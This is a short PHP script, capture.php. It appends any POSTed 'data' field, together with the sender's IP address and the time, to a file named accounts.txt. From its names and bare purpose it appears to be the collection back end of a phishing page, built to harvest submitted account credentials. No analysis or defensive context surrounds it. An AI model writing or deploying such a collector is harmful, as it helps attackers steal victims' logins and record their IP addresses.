<?php
// capture.php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = $_POST['data'];
    $log = "LOG: " . $data . " | IP: " . $_SERVER['REMOTE_ADDR'] . " | TIME: " . date("H:i:s") . PHP_EOL;
    file_put_contents("accounts.txt", $log, FILE_APPEND);
}
?>
